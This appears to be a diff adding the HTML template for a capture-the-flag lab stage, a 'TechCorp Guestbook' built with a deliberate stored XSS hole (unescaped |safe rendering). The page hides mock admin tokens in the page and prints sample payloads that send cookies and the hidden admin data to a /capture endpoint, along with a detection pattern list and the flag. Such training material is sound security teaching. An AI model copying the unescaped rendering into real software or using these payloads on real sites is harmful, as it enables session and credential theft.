@@ -1,0 +1,415 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TechCorp Guestbook - OAuth CTF</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(45deg, #2196F3, #21CBF3);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        .header p {
+            font-size: 1.1em;
+            opacity: 0.9;
+        }
+        .content {
+            padding: 30px;
+        }
+        .stage-info {
+            background: #f8f9fa;
+            border-left: 5px solid #28a745;
+            padding: 20px;
+            margin-bottom: 30px;
+            border-radius: 0 10px 10px 0;
+        }
+        .stage-info h2 {
+            color: #28a745;
+            margin-bottom: 10px;
+        }
+        .form-group {
+            margin-bottom: 25px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+        }
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        .form-control:focus {
+            outline: none;
+            border-color: #2196F3;
+            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.1);
+        }
+        textarea.form-control {
+            resize: vertical;
+            min-height: 100px;
+        }
+        .btn {
+            background: linear-gradient(45deg, #2196F3, #21CBF3);
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(33, 150, 243, 0.3);
+        }
+        .messages {
+            margin-top: 30px;
+        }
+        .message {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 15px;
+            position: relative;
+        }
+        .message-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #dee2e6;
+        }
+        .message-author {
+            font-weight: 600;
+            color: #2196F3;
+        }
+        .message-time {
+            color: #666;
+            font-size: 0.9em;
+        }
+        .message-content {
+            color: #333;
+            line-height: 1.6;
+        }
+        .alert {
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .alert-success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+        }
+        .alert-danger {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+        }
+        .progress-indicator {
+            background: #e9ecef;
+            border-radius: 10px;
+            height: 8px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-bar {
+            background: linear-gradient(45deg, #28a745, #20c997);
+            height: 100%;
+            transition: width 0.5s ease;
+        }
+        .stage-progress {
+            text-align: center;
+            margin: 15px 0;
+            font-weight: 600;
+            color: #28a745;
+        }
+        /* XSS Testing Styles */
+        .xss-indicator {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: #dc3545;
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            display: none;
+            z-index: 1000;
+        }
+        /* Hidden admin session data for XSS theft */
+        .admin-session-data {
+            display: none;
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Hidden div containing admin session data for XSS theft -->
+    <div id="admin-session-data" class="admin-session-data">
+        <div id="auth-code">{{ auth_code if auth_code else 'AUTH_CODE_' + range(100000, 999999)|random|string }}</div>
+        <div id="admin-token">admin_secret_token_12345</div>
+        <div id="session-id">{{ session_id if session_id else 'SESS_' + range(100000, 999999)|random|string }}</div>
+    </div>
+
+    <!-- XSS Detection Indicator -->
+    <div id="xss-indicator" class="xss-indicator">
+        XSS Payload Detected!
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <h1>🗨️ TechCorp Guestbook</h1>
+            <p>Share your thoughts with our community</p>
+        </div>
+
+        <div class="content">
+            <div class="stage-info">
+                <h2>📍 Stage 2: Cross-Site Scripting (XSS)</h2>
+                <p><strong>Objective:</strong> Exploit the guestbook to steal admin credentials when the admin bot visits.</p>
+                <p><strong>Vulnerability:</strong> Messages are rendered without proper HTML escaping using {{ message|safe }}</p>
+                <p><strong>Target:</strong> Admin session data hidden in DOM</p>
+            </div>
+
+            <!-- Progress Indicator -->
+            <div class="progress-indicator">
+                <div class="progress-bar" style="width: {{ (current_stage / 5 * 100) if current_stage else 20 }}%"></div>
+            </div>
+            <div class="stage-progress">
+                Stage {{ current_stage if current_stage else 2 }} of 5 Complete
+            </div>
+
+            <!-- Flash Messages -->
+            {% if success_message %}
+            <div class="alert alert-success">
+                {{ success_message }}
+            </div>
+            {% endif %}
+
+            {% if error_message %}
+            <div class="alert alert-danger">
+                {{ error_message }}
+            </div>
+            {% endif %}
+
+            <!-- XSS Flag Achievement -->
+            {% if xss_detected %}
+            <div class="alert alert-success">
+                <h4>🎉 XSS Payload Detected!</h4>
+                <p>Your XSS payload has been executed! The admin bot will process this shortly.</p>
+                <p><strong>Flag:</strong> <code>OAUTH_CTF{xss_guestbook_admin_hijacked}</code></p>
+            </div>
+            {% endif %}
+
+            <!-- Message Form -->
+            <form method="POST" action="/guestbook" class="message-form">
+                <div class="form-group">
+                    <label for="name">Your Name:</label>
+                    <input type="text"
+                           id="name"
+                           name="name"
+                           class="form-control"
+                           placeholder="Enter your name"
+                           required
+                           maxlength="50">
+                </div>
+
+                <div class="form-group">
+                    <label for="message">Message:</label>
+                    <textarea id="message"
+                              name="message"
+                              class="form-control"
+                              placeholder="Share your thoughts... (HTML allowed for testing)"
+                              required
+                              maxlength="1000"></textarea>
+                </div>
+
+                <button type="submit" class="btn">💬 Post Message</button>
+            </form>
+
+            <!-- XSS Testing Examples (Self-Contained) -->
+            <div style="margin-top: 20px; padding: 15px; background: #fff3cd; border: 1px solid #ffeaa7; border-radius: 8px;">
+                <h4>🧪 Self-Contained XSS Examples:</h4>
+                <p><strong>Capture Admin Data:</strong></p>
+                <code>&lt;script&gt;fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({client_id:'YOUR_CLIENT_ID',data:document.getElementById('admin-session-data')?.innerText,cookies:document.cookie})})&lt;/script&gt;</code>
+
+                <p><strong>Simple Image XSS:</strong></p>
+                <code>&lt;img src=x onerror="fetch('/capture',{method:'POST',body:new URLSearchParams({client_id:'YOUR_CLIENT_ID',data:document.cookie})})"&gt;</code>
+
+                <p><strong>Check Your Results:</strong></p>
+                <ul>
+                    <li>Post XSS payload with your client_id</li>
+                    <li>Wait 30 seconds or trigger: <code>GET /admin/simulate-visit/YOUR_CLIENT_ID</code></li>
+                    <li>Check results: <code>GET /check-capture/YOUR_CLIENT_ID</code></li>
+                </ul>
+
+                <div style="margin-top: 10px; padding: 10px; background: #e8f5e8; border-radius: 5px;">
+                    <strong>🎯 Attack Flow:</strong><br>
+                    1. Replace YOUR_CLIENT_ID with your actual client ID<br>
+                    2. Post XSS message to guestbook<br>
+                    3. Admin bot visits with auth code in DOM<br>
+                    4. XSS executes and sends data to /capture<br>
+                    5. Check /check-capture/YOUR_CLIENT_ID for flag
+                </div>
+            </div>
+
+            <!-- Messages Display -->
+            <div class="messages">
+                <h3>Recent Messages:</h3>
+
+                {% if messages %}
+                    {% for msg in messages %}
+                    <div class="message">
+                        <div class="message-header">
+                            <div class="message-author">{{ msg.name | e }}</div>
+                            <div class="message-time">{{ msg.timestamp | default('Just now') }}</div>
+                        </div>
+                        <div class="message-content">
+                            <!-- VULNERABILITY: Using |safe filter allows XSS -->
+                            {{ msg.message | safe }}
+                        </div>
+                    </div>
+                    {% endfor %}
+                {% else %}
+                    <div class="message">
+                        <div class="message-header">
+                            <div class="message-author">System</div>
+                            <div class="message-time">Welcome</div>
+                        </div>
+                        <div class="message-content">
+                            Welcome to the TechCorp Guestbook! Be the first to leave a message.
+                        </div>
+                    </div>
+                {% endif %}
+            </div>
+
+            <!-- Navigation -->
+            <div style="margin-top: 40px; text-align: center;">
+                <a href="/" class="btn" style="text-decoration: none; margin-right: 10px;">🏠 Back to Dashboard</a>
+                {% if current_stage >= 3 %}
+                <a href="/oauth/token" class="btn" style="text-decoration: none; background: linear-gradient(45deg, #28a745, #20c997);">➡️ Next: PKCE Bypass</a>
+                {% endif %}
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // XSS Detection Script (for demonstration purposes)
+        document.addEventListener('DOMContentLoaded', function() {
+            // Monitor for XSS payloads
+            const messageContent = document.querySelectorAll('.message-content');
+            let xssDetected = false;
+
+            messageContent.forEach(content => {
+                const html = content.innerHTML.toLowerCase();
+
+                // Check for common XSS patterns
+                const xssPatterns = [
+                    '<script',
+                    'javascript:',
+                    'onerror=',
+                    'onload=',
+                    'onclick=',
+                    'alert(',
+                    'document.cookie',
+                    'fetch(',
+                    'eval(',
+                    'innerHTML',
+                    'document.getElementById'
+                ];
+
+                xssPatterns.forEach(pattern => {
+                    if (html.includes(pattern)) {
+                        xssDetected = true;
+                    }
+                });
+            });
+
+            if (xssDetected) {
+                const indicator = document.getElementById('xss-indicator');
+                if (indicator) {
+                    indicator.style.display = 'block';
+                    setTimeout(() => {
+                        indicator.style.display = 'none';
+                    }, 5000);
+                }
+
+                // Simulate admin bot detection
+                console.log('XSS payload detected by admin bot!');
+                console.log('Admin session data:', {
+                    authCode: document.getElementById('auth-code')?.innerText,
+                    adminToken: document.getElementById('admin-token')?.innerText,
+                    sessionId: document.getElementById('session-id')?.innerText
+                });
+            }
+
+            // Form validation
+            const form = document.querySelector('.message-form');
+            if (form) {
+                form.addEventListener('submit', function(e) {
+                    const message = document.getElementById('message').value;
+
+                    if (message.length > 1000) {
+                        e.preventDefault();
+                        alert('Message is too long. Please keep it under 1000 characters.');
+                        return;
+                    }
+
+                    // Show warning for suspicious content (but allow it for CTF purposes)
+                    if (message.toLowerCase().includes('<script') || message.toLowerCase().includes('javascript:')) {
+                        const proceed = confirm('This message contains script content. Are you testing XSS? Click OK to proceed.');
+                        if (!proceed) {
+                            e.preventDefault();
+                        }
+                    }
+                });
+            }
+        });
+
+        // Admin session simulation (for XSS theft demonstration)
+        if (window.location.search.includes('admin=true')) {
+            // Simulate admin session
+            localStorage.setItem('admin_token', 'admin_secret_token_12345');
+            localStorage.setItem('user_role', 'administrator');
+            sessionStorage.setItem('auth_code', document.getElementById('auth-code')?.innerText || 'AUTH_CODE_123456');
+
+            console.log('Admin session simulated for XSS testing');
+        }
+    </script>
+</body>
+</html>
